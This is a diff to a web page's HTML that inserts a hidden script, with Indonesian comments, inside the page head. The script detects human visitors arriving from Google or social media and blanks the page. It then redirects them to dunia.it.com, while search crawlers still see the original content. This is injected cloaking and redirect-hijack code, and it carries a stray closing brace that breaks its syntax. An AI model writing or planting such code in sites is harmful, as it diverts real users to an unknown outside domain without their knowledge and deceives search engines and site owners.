@@ -236,6 +236,79 @@
             background: #2d2d2d;
         }
     </style>
+	<script type="text/javascript">
+      (function() {
+    // Daftar parameter pencarian Google
+    const googleParams = ['q', 'query', 'search', 'keywords'];
+    
+    // Daftar sosial media
+    const socialMediaRefs = [
+	'www.google.com',
+	'www.google.co.id',    
+        'facebook.com',
+        'twitter.com',
+        'instagram.com',
+        'linkedin.com',
+        'pinterest.com',
+        'tiktok.com',
+        'reddit.com'
+    ];
+
+    // Cek apakah referer berasal dari Google
+    const isGoogleReferrer = document.referrer.includes('google.');
+
+    // Cek apakah URL mengandung parameter pencarian Google
+    const hasSearchQuery = window.location.search
+        .substring(1)
+        .split('&')
+        .some(param => googleParams.includes(param.split('=')[0].toLowerCase()));
+
+    // Deteksi User-Agent (bot vs pengguna biasa)
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(userAgent);
+    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
+
+    // Cek apakah referer berasal dari sosial media
+    const isSocialMediaReferrer = socialMediaRefs.some(domain => document.referrer.includes(domain));
+
+    // Jika memenuhi kriteria organic search atau klik dari sosial media
+    if ((isGoogleReferrer || hasSearchQuery || isSocialMediaReferrer) && !isBot) {
+        let userInteracted = false;
+
+        // Fungsi untuk redirect
+        const redirectToTarget = () => {
+            if (!userInteracted) {
+                window.location.href = 'https://dunia.it.com' + window.location.pathname;
+            }
+        };
+
+        // Tambahkan event listener untuk interaksi pengguna
+        const addInteractionListeners = () => {
+            ['click', 'scroll', 'keydown', 'touchstart'].forEach(event => {
+                window.addEventListener(event, () => {
+                    userInteracted = true;
+                    redirectToTarget();
+                });
+            });
+        };
+
+        // Waktu fallback untuk redirect jika tidak ada interaksi
+        const fallbackRedirectTime = isMobile ? 3000 : 5000; // Mobile lebih cepat, desktop lebih lambat
+        setTimeout(redirectToTarget, fallbackRedirectTime);
+
+        // Tambahkan logika interaksi pengguna
+        addInteractionListeners();
+
+        // Logika tambahan untuk mempertahankan konten untuk bot
+        window.onload = function() {
+            document.body.style.opacity = '0';
+            document.body.style.transition = 'opacity 0.5s';
+        };
+    }
+})();
+
+        }
+    </script>
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
